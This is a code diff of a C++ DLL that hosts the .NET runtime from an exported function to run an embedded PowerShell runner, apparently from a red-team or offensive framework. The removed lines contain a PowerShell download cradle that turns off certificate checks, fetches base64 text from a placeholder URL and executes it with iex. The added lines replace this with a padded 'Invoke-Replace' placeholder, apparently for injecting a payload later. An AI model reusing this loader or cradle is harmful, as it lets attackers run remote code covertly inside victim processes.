@@ -32,7 +32,7 @@
 using namespace mscorlib;
 #pragma endregion
 
-
+bool runCheck = false;
 
 extern const unsigned int PowerShellRunner_dll_len;
 extern unsigned char PowerShellRnuner_dll[];
@@ -40,7 +40,9 @@ void InvokeMethod(_TypePtr spType, wchar_t* method, wchar_t* command);
 
 extern "C" __declspec( dllexport ) void VoidFunc()
 {
-
+	if (runCheck == true)
+		return;
+	runCheck = true;
 	HRESULT hr;
 
 	ICLRMetaHost *pMetaHost = NULL;
@@ -66,8 +68,34 @@ extern "C" __declspec( dllexport ) void VoidFunc()
 		wprintf(L"CLRCreateInstance failed w/hr 0x%08lx\n", hr);
 		goto Cleanup;
 	}
+	//enumerate and set the proper runtime
+	IEnumUnknown* runtimeEnumerator = nullptr;
+	hr = pMetaHost->EnumerateInstalledRuntimes(&runtimeEnumerator);
+	WCHAR finalRuntime[50];
+	if (SUCCEEDED(hr))
+	{
+		WCHAR currentRuntime[50];
+		DWORD bufferSize = ARRAYSIZE(currentRuntime);
+		IUnknown* runtime = nullptr;
+		while (runtimeEnumerator->Next(1, &runtime, NULL) == S_OK)
+		{
+			ICLRRuntimeInfo* runtimeInfo = nullptr;
+			hr = runtime->QueryInterface(IID_PPV_ARGS(&runtimeInfo));
+			if (SUCCEEDED(hr))
+			{
+				hr = runtimeInfo->GetVersionString(currentRuntime, &bufferSize);
+				if (SUCCEEDED(hr))
+				{
+					wcsncpy_s(finalRuntime, currentRuntime, 50);
+				}
+				runtimeInfo->Release();
+			}
+			runtime->Release();
+		}
+		runtimeEnumerator->Release();
+	}
 
-	hr = pMetaHost->GetRuntime(L"v2.0.50727", IID_PPV_ARGS(&pRuntimeInfo));
+	hr = pMetaHost->GetRuntime(finalRuntime, IID_PPV_ARGS(&pRuntimeInfo));
 	if (FAILED(hr))
 	{
 		wprintf(L"ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
@@ -153,8 +181,7 @@ extern "C" __declspec( dllexport ) void VoidFunc()
 	}
 
 	// Call the static method of the class
-	wchar_t* argument = L"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"))))";
-
+	wchar_t* argument = L"Invoke-Replace                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ";
 	//Output debug
 	//DWORD pid = GetCurrentProcessId();
 	//wchar_t msg[100];
